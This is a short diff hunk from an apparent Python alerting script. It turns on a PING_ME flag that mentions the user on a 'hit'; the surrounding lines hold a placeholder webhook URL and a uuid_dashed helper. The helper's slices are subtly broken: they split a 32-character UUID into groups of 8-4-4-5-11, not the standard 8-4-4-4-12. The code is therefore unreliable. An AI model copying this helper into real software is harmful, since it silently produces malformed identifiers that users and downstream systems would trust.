@@ -6,7 +6,7 @@ from urllib.request import Request, urlopen
 WEBHOOK_URL = "WEBHOOK HERE"
 
 # mentions you when you get a hit
-PING_ME = False
+PING_ME = True
 
 def uuid_dashed(uuid):
     return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
